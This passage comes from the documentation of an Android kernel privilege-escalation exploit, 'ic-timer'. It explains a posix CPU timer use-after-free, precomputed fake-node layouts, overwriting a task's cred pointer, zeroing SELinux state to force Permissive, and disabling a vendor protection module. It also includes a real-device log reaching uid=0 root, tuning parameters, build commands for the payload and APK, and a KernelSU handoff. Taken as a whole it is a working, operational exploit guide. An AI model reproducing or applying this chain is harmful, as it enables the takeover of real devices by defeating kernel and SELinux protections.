- When A is reaped (`release_task` → `posix_cpu_timers_exit`), A's base's
  leftmost still points at X; at that moment X has already been reused by
  candidate 0. So this cleanup **clears candidate 0's head** while candidate
  0 itself still hangs in worker 0's base — that is the "tree borrowing".

### 14.2 Dequeue: `cpu_timer_dequeue`

```c
static inline bool cpu_timer_dequeue(struct cpu_timer *ctmr)
{
    if (ctmr->head) {
        timerqueue_del(ctmr->head, &ctmr->node);
        ctmr->head = NULL;
        return true;
    }
    return false;
}
```

- `timer_delete(candidate 0)` goes `posix_cpu_timer_del` → `disarm_timer` →
  `cpu_timer_dequeue`. Because `ctmr->head` was already nulled by A's
  cleanup, this **returns false immediately without removing X from
  worker 0's base**.
- Afterwards X's bytes belong entirely to the stolen psl page; worker 0's
  base still treats it as its cached leftmost.

### 14.3 collect: `collect_timerqueue`

```c
static u64 collect_timerqueue(struct timerqueue_head *head,
                              struct list_head *firing, u64 now)
{
    struct timerqueue_node *next;
    int i = 0;

    while ((next = timerqueue_getnext(head))) {
        struct cpu_timer *ctmr;
        u64 expires;

        ctmr = container_of(next, struct cpu_timer, node);
        expires = cpu_timer_getexpires(ctmr);
        if (++i == MAX_COLLECTED || now < expires)
            return expires;

        ctmr->firing = 1;
        rcu_assign_pointer(ctmr->handling, current);   /* ← leak/win marker */
        cpu_timer_dequeue(ctmr);                        /* ← uses ctmr->head */
        list_add_tail(&ctmr->elist, firing);
    }
    return U64_MAX;
}
```

- `timerqueue_getnext(head)` reads worker 0's base's `rb_leftmost` = X;
- `expires` is our s1's q3=1, so `now < expires` doesn't hold → continue;
- `firing=1`, `handling=current`, then `cpu_timer_dequeue` dequeues through
  q4 = fake_head (C-0x10) — **the real base's tree is never touched**;
- `list_add_tail` points elist at the `firing` list on the kernel stack.

### 14.4 Epilogue: `handle_posix_cpu_timers`

```c
list_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {
    spin_lock(&timer->it_lock);          /* ← s1's it_lock=1 parks the winner here */
    list_del_init(&timer->it.cpu.elist);
    ...
    rcu_assign_pointer(timer->it.cpu.handling, NULL);
    spin_unlock(&timer->it_lock);
}
```

- s1 sets `it_lock` to 1, so the winner parks forever on `spin_lock`;
  `handling` stays `current`, and the main thread obtains the winner's task
  pointer through the psl readback (stage1's "winner").
- Stage2's release rewrite flips the lock word atomically to 0; the winner
  continues through `list_del_init` / `firing=0` / `handling=NULL` / unlock,
  and the 3600s `cpu_timer_fire` path returns to userspace. **After the
  release, the attempt must not exit**, because its base still points at the
  rewritten page.

### 14.5 Why the second collect "returns normally"

- Stage2's q2 = `winner + 0x838` (winner->cred), q4 = `winner + 0x7c8`
  (the real head). The next tick's collect dequeues against the real head:
  - `timerqueue_del(real head, X)`'s `rb_erase` epilogue writes
    **C (slab+cred_off) into `winner->cred`**, and writes that field's
    address into `C+0x08` (gid|suid);
  - The second round's `expires` reads `C+0x18` (egid|fsuid =
    `0xffffffff00000000`, a huge u64), so `now < expires` holds, the loop
    returns immediately, and no later node is harmed.
- That is precisely the "swap the cred pointer for the fake cred" step.

---

## 15. The Math of the Case Table and the Release Rewrite

### 15.1 Field map (`model/mcastrel4.py::field_set`)

| Field | Offset relative to X | Size |
|---|---|---|
| q0 (rb_parent_color / scratch) | +0x00 | 8 |
| q1 (rb_right) | +0x08 | 8 |
| q2 (rb_left) | +0x10 | 8 |
| q3 (expires) | +0x18 | 8 |
| q4 (ctmr->head) | +0x20 | 8 |
| q5 (ctmr->pid) | +0x28 | 8 |
| elist.next | +0x30 | 8 |
| elist.prev | +0x38 | 8 |
| firing | +0x40 | 4 |
| handling | +0x48 | 8 |
| sigev | -0x24 | 4 |
| it_lock | -0x58 | 4 |

Every field's residue is `(L + off) & 0xff`; **the model only solves within
the 0x100 window**, so the absolute boundary (`block_fits`) must hold
separately:

```
∀ field: 0 <= L + off and L + off + size <= 0x100
```

L=0x40 violates exactly the `it_lock` (-0x58) clause, which is why 0.10.2
removed it from the table.

### 15.2 Layout solving (`model/lay12.py`)

- The cred's phase is fixed at **0x18** (case 0 uses 0x118), because
  stage1's fake_head = C-0x10 must land on the psl header's
  `rcu.next/rcu.func` (read-only, unreachable by our rewrite) and
  rb_leftmost ≠ X;
- Each auxiliary object (`ns` 0x298, `ucounts` 0x90, `user` 0xa8,
  `gi` 0x8+…) finds a spot inside the slab that doesn't overlap node fields,
  the tsec, or other objects;
- The `tsec` must sit in block O's remaining window, 18 bytes, and a
  trailing 16 all-zero bytes would break the "14 pairwise-distinct source
  slots" delete semantics — so the 16-aligned start is tried last;
- The `scratch` **write region** `[s+0x10, s+0x20)` must avoid all node
  fields (the read region `[s, s+0x10)` may overlap filler/tsec).

### 15.3 Generator and verification

```
mcastrel4.py  ──(lay12.solve + build/build_s1)──▶  case parameters
        │
        └── gen_mcast_tables.py  ──▶  mcast_pats.h
verify_tables.py: parse the C table → rebuild base/s1/s2 with the same model
                 → byte-for-byte comparison + block_fits check
```

A 7/7 pass of `verify_tables.py` is the hard pre-release gate; any manual
edit to the tables gets caught here.

### 15.4 Byte-level timing of the release rewrite (`ic_mc_replace_parked`)

Let the 14 source slots be `S[0..13]`, the lock slot `c_lock`, and T1 the
post-collect readback mirror:

1. Read back T1 and check that the 14 16-byte slots are pairwise distinct;
   check `word(T1, r0) & 1 == 1` (winner still parked);
2. **Tail deletes**: `for k = 13 down to c_lock+1: del S[k]`. Deletes shift
   left by value; with the lock slot at `c_lock`, tail deletes never move it;
3. **Head deletes**: `for k = 0 .. c_lock-1: del S[0]` (re-reading after each
   delete to confirm the lock word is still 1);
4. **Appends**: add the new sources in order 0..13; the `c_lock + 1`-th
   append lands on the lock slot; both 8-byte halves of the 16-byte store
   contain the full 4-byte lock word, so the `1 → 0` flip is atomic;
5. Once the appends complete, the winner is released, and the next tick's
   collect completes the erase using the real head.

For L=0x78..0xa8, `c_lock` takes the values `0,1,1,2,2,3,3`.

### 15.5 Why "tail deletes first, head deletes after"

Head deletes only write `0..count-2`, so as long as the lock slot is at
`c_lock`, the head-delete phase never overwrites it; tail deletes walk
backwards and never move it either. If head deletes ran first, the lock slot
would shift left and the append's atomic release point would be wrong.

---

## 16. Annotated Walkthrough of a Real-Device Success Log

Using `ic-app-a1793511273.log` from the slot-D 7.6 GB / ReSukiSU unit:

```
[dev] build=PD2506D_A_16.1.15.0.W10 ... mem=7595976kB ksu=no
[slide] anchors=11 ... votes=11 supported_by=11
SLIDE=0x2c6ec00000 FUNCS=0xffffffec78ed18a0 ...
```
- 11 votes, 11 distinct anchors supporting the same slide, 2 MB aligned;
  `FUNCS = 0xffffffc008000000 + SLIDE + 0x22d18a0`.

```
[auto] [2/3] vr.ko present: zero funcs <- 0xffffffec78ed18a0
[auto] zero funcs landed
```
- `zero_attempt`'s unixstr chain: spray → fill → reap B → LEAK →
  `[zero] target=` → park. Success only means "the write executed".

```
[auto] zero selinux landed
[auto] SELinux Permissive, initialized intact
```
- After the `state-7` zero-write, `getenforce=Permissive` and `policyvers`
  is readable.

```
[auto] [3/3] mcast chain ctxmap=u:r:shell:s0 userns=0xffffffec78d00df0 attempts=16
[peak] attempt 0/1/2 parked
```
- The first three attempts hit unsupported geometries like `L=0xd8/0x48/0x60`,
  or failed a chain/spray gate.

```
[mcast] LEAK x=0xffffff8050142180 off=0x180
[mcast] case L=0x80 O=1 ord=1074/38464 slab=0xffffff8050142000 cred=0xffffff8050142018
[mcast] real user_ns patch res=0xa0 uid=0x1c ucn=0xc8/0xd0
[mcast] base written over [1034,1114]
[mcast] stage1 parked winner=0xffffff801d98aa00
[mcast] stage2 erased, cred=0xffffff8050142018 fake_uid=0xffffff80 img_sid=0xa
```
- L=0x80 / O=1: all fields inside block O; base written across 1034..1114
  (±40);
- The real-userns four pokes hit base only;
- Stage1's handling received the winner's task pointer;
- Stage2 wrote the cred address into winner->cred.

```
[stage] real_uid=2000 sidtab_entries=2696
[ctxmap] sids 0..2788 target=u:r:shell:s0
[ctxmap] u:r:shell:s0 = sid 2511
[helper] launched euid=0 uid=0 probe_err=0 ctx=u:r:shell:s0
[helper] cmd euid=0 uid=0 ctx=u:r:shell:s0
```
- The winner's worker rewrote the tsec's sid via the psl and scanned until
  it found shell's sid;
- The helper's euid/uid are both 0 (the uid=0 patch works; older versions
  showed -128 here).

```
[ksu] late-load(allow-shell) rc=0
[ksu] handoff OK
uid=0(root) ... context=u:r:shell:s0
LPE-PROOF
```
- The 0.10.4-era script reported OK purely on rc=0; the manager
  subsequently showed jailbreak mode, proving the LKM had actually loaded
  (asynchronously, silently).
- The payload's `id`/`getenforce` are the final proof.

---

## 17. FAQ

**Q1: Why not reclaim with io_uring directly?**
The shell domain's `anon_inode_create` is denied by SELinux; AIO's rings are
order-0 and cannot capture a discarded order-1 slab. psl/unixstr are the only
order-1 candidates that are creatable, editable in place, and readable back.

**Q2: Why does the zero-write use unixstr while the main chain uses mcast?**
The zero-write needs only one 8-byte write + park; unixstr's 8K-fragment
window is short and cheap. The main chain needs 14 editable slots and a
stable readback — only psl can do that.

**Q3: Why both A and B — can't one victim do?**
A provides the stale leftmost; B guarantees the slot is reallocated before
the candidate and pushed back to the freelist head; A's reap must happen
after the candidate occupies X, so it can clear the candidate's head.

**Q4: Why can stage1 end with "no winner"?**
Two kinds: collect never ran (base doesn't point at X, typically a candidate
placement miss — invisible to the A/B/C count gates), or collect ran but
`handling` couldn't be read (read offset/pointer checks). 0.10.2's
`handle=/elist=` distinguishes the two.

**Q5: Why is `L=0x40` unusable?**
`it_lock` sits at -0x58; with L=0x40 it lands in the adjacent psl object, s1
writes it where the kernel doesn't read, and `handling` is cleared right
after collect. `block_fits` now forbids generating it.

**Q6: Why hit `selinux_state-7` instead of +0?**
`initialized` is bit16 (the +2 byte); hitting +0 clears enforcing and
initialized together, entering the uninitialized state: new inodes get no
labels → /data becomes unlabeled. The -7 8-byte window covers only
`[state-7, state]`.

**Q7: Why must vr.ko be de-probed?**
`vr.ko`'s `sys_exit` callback kills root tasks by task tag + euid/fsgid;
once the fake cred has euid=0, the winner's first syscall gets it killed
(ladder=1). After zeroing `__tracepoint_sys_exit->funcs`, the event loop
skips the callback.

**Q8: Why is KSU late-load's empty output with rc=0 a success?**
These forks' success paths print nothing, and the module may appear
asynchronously; the manager UI's "jailbreak mode" is authoritative. 0.10.6
switched to polling /proc/modules + wide matching + `ksud install`.

**Q9: Why does `id` show a weird gid?**
Stage-2's erase writes the field address into cred+0x08 (gid|suid), so gid
is an address residue. uid 0 and caps are unaffected; the helper can run
`setresgid(0)/setgroups(0)` first if needed.

**Q10: Why reboot before every run?**
A parked attempt holds a rewritten base and ~10 MB of psl sockets;
overlap/residue changes the allocator state. On a panic_on_oops=1 device, a
leftover bad node also oopses at exit. Rebooting is the only cleanup.

---

## 18. Operational and Safety Rules

1. **One round per boot**; on failure, reboot and retry — never stack
   attempts in the same boot.
2. **Never kill -9** any ic-timer/payload process: their bases point at
   rewritten pages, and exiting walks a bad node (SIGKILL/process-group
   kills both oops).
3. Don't unplug USB or force-stop during or after a run; HUP/INT/TERM are
   ignored by the script, but SIGKILL still detonates.
4. Verify `getenforce` and `policyvers` immediately after the SELinux
   zero-write; unreadable means `initialized` was cleared — reboot
   immediately.
5. Logs are written twice; bring back the app log together with
   `zero-*.log` after a run.
6. Do not run this on other people's devices; authorized test units only.

---

## Appendix A: Key Parameters (Device-Validated Configuration)

| Parameter | Value | Purpose |
|---|---|---|
| `IC_PAD_ALIGN` | 1 | slab padding alignment |
| `IC_PAD_KEEP` | 4185 | timers kept during padding |
| `IC_FLUSH_SPARSE` | 15 | sparse flush step |
| `IC_SPRAY_EARLY` | 1 | early spray |
| `IC_EARLY_PRIME` | 1024 | pcp prime |
| `IC_SKB_SOCKS` | 8 | drain socket count |
| `IC_SKBF_MIN` | 8 | minimum drain |
| `IC_SAFE_FILL` | 4000 | miss-safe fill |
| `IC_LATE_FILL` | 2000 | late-release fill |
| `IC_ATTEMPT_WAIT` | 900 (×200 ms) | keep attempts from overlapping |
| `IC_ATTEMPTS` | 16 | mcast attempt cap |
| `ZERO_ATTEMPTS` | 6 | zero-write attempt cap |
| `IC_MCAST_FDS/GROUPS/TAIL` | 600 / 64 / 64 | psl spray scale |
| `IC_UNXSTR_MSGS` | 8192 | 8K-fragment message count |
| `IC_REAL_INIT_USER_NS` | slide output | real userns |
| `IC_SCAN_CTXMAP` | `u:r:shell:s0` (stock) / `u:r:ksu:s0` | end-game ctxmap |

## Appendix B: Reading the Logs

- `[dev]`: machine identification (model/build/kernel/mem/ksu).
- `[slide]`: votes, anchors, SLIDE/FUNCS/SELINUX_STATE/INIT_USER_NS.
- `[auto]`: orchestrator stages; `zero ... landed` = zero-write success.
- `[peak]`: attempt lifecycle (A/B/C, spray, fill, park).
- `[slab]`: num_objs snapshots of posix_timers_cache / kmalloc-256.
- `[mcast]`: LEAK / case / patch / stage1 / stage2.
- `[ctxmap]`, `[mcsid]`, `[stage]`: end-game sid scan.
- `[ksu]`: handoff (late-load, modules, su, dmesg).

## Appendix C: Build and File Inventory

```
exploit/     timer_lpe.c, mcast_pats.h, _anchors.gen
model/       mcastrel4.py, lay12.py, gen_mcast_tables.py, verify_tables.py
harness/     reap_init_sb.c, run_shellboot.sh, cpio_repack.py, cpiocat.py,
             slide_test_init.c, vote_slide.py
apk/         AndroidManifest.xml, build.sh, src/, aidl/, assets/run_lpe.sh,
             assets/ksu_handoff.sh
device/      run_lpe.sh, zero.sh, run.sh, collect.sh, ksu_handoff.sh,
             params.env.example, tools/vote.py, tools/syms150.txt
docs/        this document
```

Build:

```sh
# payload
aarch64-linux-android24-clang -O2 -g -static -D_GNU_SOURCE \
    -fno-emulated-tls -o exploit.device exploit/timer_lpe.c
# APK (needs a local Android SDK/JDK; put the payload into apk/assets/ic-timer)
cd apk && sh build.sh
# QEMU initrd
zig cc -target aarch64-linux-musl -O2 -g -o init harness/reap_init_sb.c
python harness/cpio_repack.py <base>.cpio.gz <out>.cpio.gz init=init exploit=exploit.device
```

---

## Appendix D: Version History (0.1 → 0.10.6)

| Version | Key changes |
|---|---|
| 0.1–0.4 (2026-10-24/25) | AIO path and mcast port; run18 first real-device root (15.0, `L=0x78`); KSU handoff script (late-load) |
| 0.5 (10-27) | late fill (for pages freed late by call_rcu), slabsnap, drop diagnostics; `[mcast] drop at objs=N` |
| 0.6 | winner self-check (`[stage] winner=self`), silent-worker roll call, mcast failures park |
| 0.7 | `setsid()`: unplugging USB / killing the process group SIGKILLs parked attempts → avoided |
| 0.8 | built-in de-probing (`IC_DISARM_VR`) |
| 0.9.x (10-27) | 0.9.1 de-probe spinner; 0.9.2 7kimisu; 0.9.3 worker entry markers; 0.9.4 silent workers' tid/st/syscall/wchan + `[dev]`; 0.9.5 w0 no longer calls getuid; 0.9.6 ladder fields |
| 0.10.1 (10-31) | one-tap APK chain: built-in slide, pre-chain vr de-probe, `selinux_state-7`, mcast, dual logs |
| 0.10.2 (11-01) | fix real-userns corrupting s1/s2; `block_fits` drops L=0x40; stage1 diagnostics/re-trigger; de-probe toggle removed; attempts 10→16 |
| 0.10.3 | `cred->uid=0` + fake `ucounts` ns/uid patch, eliminating the `dec_rlimit_ucounts` WARN |
| 0.10.4 | zero-write stage no longer gives up on the first `no leak` (waits for `[zero] target=`/`no root after`/process exit, `ZERO_ATTEMPTS=6`) |
| 0.10.5 | KSU handoff verification/diagnostics: module+su for OK, `--kmi` fallback, `ksud install`, dmesg/ksu logs |
| 0.10.6 | handoff switched to polling `/proc/modules` (module names vary and may be asynchronous), wide matching, `command -v su`, false positives fixed |

## Appendix E: Per-Machine Parameter Suggestions

| Machine profile | Suggestion |
|---|---|
| SigQ 44195 / 11.7 GB (slot B) | defaults are fine (PAD_KEEP 4185, fill 4000, late 2000) |
| SigQ 28179 / 7.6 GB (slot D) | defaults also succeed; but the fill is truncated (`fill stop 2186/4000`, `late fill 0/2000`). If you see miss reboots on such a unit, lower `IC_PAD_KEEP` to ~3000, shrink the pool accordingly to leave SigQ for the fill, or lower `IC_FLUSH_SPARSE` |
| stock (no ksu domain) | must use `selinux_state-7`, `IC_SCAN_CTXMAP=u:r:shell:s0` |
| with vivoKSU / a ksu domain | can skip state-7, `IC_SCAN_CTXMAP=u:r:ksu:s0` |
| 7kimisu | package `com.sevenk.core` (a few builds use `com.sevenkimimasy.love`); the script accepts both |
| ReSukiSU | `com.resukisu.resukisu`; late-load with empty output rc=0 is normal — the manager's jailbreak mode is authoritative |

## Appendix F: Log File Naming and Collection

- App: `/data/local/tmp/ic-app-a<epoch>.log`, mirrored to
  `/sdcard/Download/ic-app-a<epoch>.log`.
- Zero-write: `/data/local/tmp/zero-funcs.log`, `zero-selinux.log`.
- Collection: `adb pull /sdcard/Download/ic-app-a<epoch>.log`, or grab it
  from a file manager.
- Kernel-side evidence: after a reboot,
  `/sys/fs/pstore/console-ramoops-0` (needs root or a readable pstore);
  otherwise the app log suffices to tell which stage the chain reached.

---

*This document ships with the source package `ic-timer-source-0.10.6`; code is
authoritative for exact line numbers and constants.*
